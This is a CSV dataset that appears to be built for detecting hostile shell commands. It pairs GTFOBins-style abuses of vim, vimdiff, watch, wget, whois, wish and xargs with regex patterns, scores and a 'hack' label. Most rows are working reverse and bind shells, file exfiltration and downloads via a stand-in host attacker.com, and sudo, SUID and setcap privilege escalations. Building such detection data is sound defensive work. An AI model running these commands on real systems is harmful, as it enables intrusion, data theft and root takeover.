ocode,code,word_count,match_count,match_score,hack
"vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  while true do    local r,x=t:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));t:send(b);  end;  f:close();t:close();'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\; local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'",28,11,0.8659003831417624,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"vim -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  while true do    local r,x=c:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));c:send(b);  end;c:close();f:close();'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'",28,13,1.007905138339921,0
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vim -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as r, urllib.parse as uelse: import urllib as u, urllib2 as rr.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))vim.command("":q!"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\("":q!""\)'",29,2,0.2943396226415094,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
"vim -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import http.server as s, socketserver as sselse: import SimpleHTTPServer as s, SocketServer as ssss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()vim.command("":q!"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\("":q!""\)'",30,2,0.2597864768683274,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')  local d=f:read(""*a"")  io.close(f);  local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  t:send(d);  t:close();'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:read\(""\*a""\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  t:send\(d\)\;  t:close\(\)\;'",23,9,0.8597285067873304,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vim -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(e[""URL""], e[""LFILE""])vim.command("":q!"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e""URL""\, e""LFILE""\)vim\.command\("":q!""\)'",23,2,0.32978723404255317,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vim -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  local d,x=c:receive(""*a"");  c:close();  local f=io.open(os.getenv(""LFILE""), ""wb"");  f:write(d);  io.close(f);'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(""\*a""\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, ""wb""\)\;  f:write\(d\)\;  io\.close\(f\)\;'",24,11,1.0,0
vim file_to_write,vim [\w\-_\/]+,2,1,0.6666666666666666,0
iDATA,iDATA,1,0,0.0,0
w,w,1,0,0.0,0
vim file_to_read,vim [\w\-_\/]+,2,1,0.6470588235294118,0
"vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\(""lib\.so""\)\; vim\.command\("":q!""\)'",11,1,0.3917525773195876,0
sudo install -m =xs $(which vim) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vim\) \.",7,1,0.7714285714285715,0
"./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","\./vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-pc""\, ""reset\; exec sh -p""\)'",12,1,0.4625,1
sudo vim -c ':!/bin/sh',"sudo vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",4,1,1.1666666666666667,1
"sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","sudo vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.45569620253164556,1
"sudo vim -c ':lua os.execute(""reset; exec sh"")'","sudo vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",7,1,0.6666666666666666,0
cp $(which vim) .,cp \$\(which vim\) \.,4,0,0.2222222222222222,0
sudo setcap cap_setuid+ep vim,sudo setcap cap_setuid\+ep vim,4,0,0.03333333333333333,0
"./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","\./vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.setuid\(0\)\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.45555555555555555,1
sudo install -m =xs $(which vim) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vim\) \.",7,1,0.7714285714285715,0
"./vim -c ':lua os.execute(""reset; exec sh"")'","\./vim -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.7333333333333333,0
vimdiff -c ':!/bin/sh',"vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",3,1,1.2173913043478262,1
vimdiff,vimdiff,1,0,0.0,0
:set shell=/bin/sh,":set [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.5789473684210527,0
:shell,:shell,1,0,0.0,0
"vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",11,1,0.46153846153846156,1
"vimdiff -c ':lua os.execute(""reset; exec sh"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.6808510638297872,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(""/bin/sh"")vim.command("":q!"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)pty\.spawn\(""/bin/sh""\)vim\.command\("":q!""\)'",9,3,0.49746192893401014,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  while true do    local r,x=t:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));t:send(b);  end;  f:close();t:close();'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\; local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'",28,11,0.8528301886792453,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"vimdiff -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  while true do    local r,x=c:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));c:send(b);  end;c:close();f:close();'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'",28,13,0.9922178988326849,0
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vimdiff -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as r, urllib.parse as uelse: import urllib as u, urllib2 as rr.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))vim.command("":q!"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\("":q!""\)'",29,2,0.2899628252788104,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
"vimdiff -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import http.server as s, socketserver as sselse: import SimpleHTTPServer as s, SocketServer as ssss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()vim.command("":q!"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\("":q!""\)'",30,2,0.256140350877193,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')  local d=f:read(""*a"")  io.close(f);  local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  t:send(d);  t:close();'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:read\(""\*a""\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  t:send\(d\)\;  t:close\(\)\;'",23,9,0.8444444444444444,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vimdiff -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(e[""URL""], e[""LFILE""])vim.command("":q!"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e""URL""\, e""LFILE""\)vim\.command\("":q!""\)'",23,2,0.3229166666666667,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"vimdiff -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  local d,x=c:receive(""*a"");  c:close();  local f=io.open(os.getenv(""LFILE""), ""wb"");  f:write(d);  io.close(f);'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(""\*a""\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, ""wb""\)\;  f:write\(d\)\;  io\.close\(f\)\;'",24,11,0.9823008849557522,0
vimdiff file_to_write,vimdiff [\w\-_\/]+,2,1,0.5454545454545454,0
iDATA,iDATA,1,0,0.0,0
w,w,1,0,0.0,0
vimdiff file_to_read,vimdiff [\w\-_\/]+,2,1,0.5238095238095238,0
"vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\(""lib\.so""\)\; vim\.command\("":q!""\)'",11,1,0.37623762376237624,0
sudo install -m =xs $(which vimdiff) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vimdiff\) \.",7,1,0.6923076923076923,0
"./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","\./vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-pc""\, ""reset\; exec sh -p""\)'",12,1,0.44047619047619047,1
sudo vimdiff -c ':!/bin/sh',"sudo vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:!/bin/sh'",4,1,1.0,1
"sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","sudo vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.43373493975903615,1
"sudo vimdiff -c ':lua os.execute(""reset; exec sh"")'","sudo vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",7,1,0.6153846153846154,0
cp $(which vimdiff) .,cp \$\(which vimdiff\) \.,4,0,0.18181818181818182,0
sudo setcap cap_setuid+ep vimdiff,sudo setcap cap_setuid\+ep vimdiff,4,0,0.029411764705882353,0
"./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","\./vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.setuid\(0\)\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",12,1,0.43617021276595747,1
sudo install -m =xs $(which vimdiff) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vimdiff\) \.",7,1,0.6923076923076923,0
"./vimdiff -c ':lua os.execute(""reset; exec sh"")'","\./vimdiff -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.673469387755102,0
sudo install -m =xs $(which vipw) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which vipw\) \.",7,1,0.75,0
./vipw,\./vipw,1,0,0.14285714285714285,0
sudo vipw,sudo vipw,2,0,0.0,0
watch -x sh -c 'reset; exec sh 1>&0 2>&0',"watch -x sh -c [\'|""]| -e [\'|""]|cat >.*<<.*reset\; exec sh 1>&0 2>&0'",9,1,0.6904761904761905,1
sudo install -m =xs $(which watch) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which watch\) \.",7,1,0.7297297297297297,0
./watch -x sh -c 'reset; exec sh 1>&0 2>&0',"\./watch -x sh -c [\'|""]| -e [\'|""]|cat >.*<<.*reset\; exec sh 1>&0 2>&0'",9,1,0.6818181818181818,1
sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0',"sudo watch -x sh -c [\'|""]| -e [\'|""]|cat >.*<<.*reset\; exec sh 1>&0 2>&0'",10,1,0.6170212765957447,1
sudo install -m =xs $(which watch) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which watch\) \.",7,1,0.7297297297297297,0
./watch 'reset; exec sh 1>&0 2>&0',\./watch 'reset\; exec sh 1>&0 2>&0',6,0,0.05714285714285714,1
URL=http://attacker.com/,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",1,2,1.28,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
wget --post-file=$LFILE $URL,wget [\w\-_]+=\$LFILE \$URL,3,1,0.41379310344827586,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
wget $URL -O $LFILE,wget \$URL -O \$LFILE,4,0,0.1,0
sudo install -m =xs $(which wget) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which wget\) \.",7,1,0.75,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./wget $URL -O $LFILE,\./wget \$URL -O \$LFILE,4,0,0.13636363636363635,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo wget $URL -O $LFILE,sudo wget \$URL -O \$LFILE,5,0,0.08,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"whois -h $RHOST -p $RPORT ""`cat $LFILE`""","whois -h \$RHOST -p \$RPORT ""`cat \$LFILE`""",7,0,0.07317073170731707,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"whois -h $RHOST -p $RPORT ""`base64 $LFILE`""","whois -h \$RHOST -p \$RPORT ""`base64 \$LFILE`""",7,0,0.06818181818181818,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"whois -h $RHOST -p $RPORT > ""$LFILE""","whois -h \$RHOST -p \$RPORT > ""\$LFILE""",7,0,0.08108108108108109,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""","whois -h \$RHOST -p \$RPORT \| base64 -d > ""\$LFILE""",10,0,0.08163265306122448,0
wish,wish,1,0,0.0,0
exec /bin/sh <@stdin >@stdout 2>@stderr,exec /bin/sh <@stdin >@stdout 2>@stderr,5,0,0.0,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish","echo 'set s socket \$::env\(RHOST\) \$::env\(RPORT\)\;while 1 { puts -nonewline \$s ""> ""\;flush \$s\;gets \$s c\;set e ""exec \$c""\;if {!catch {set r eval \$e} err} { puts \$s \$r }\; flush \$s\; }\; close \$s\;' \| wish",37,0,0.1282051282051282,0
sudo wish,sudo wish,2,0,0.0,0
exec /bin/sh <@stdin >@stdout 2>@stderr,exec /bin/sh <@stdin >@stdout 2>@stderr,5,0,0.0,1
xargs -a /dev/null sh,xargs -a /dev/null sh,4,0,0.0,0
echo x | xargs -Iy sh -c 'exec sh 0<&1',"echo x \| xargs -Iy sh -c [\'|""]| -e [\'|""]|cat >.*<<.*exec sh 0<&1'",10,1,0.725,1
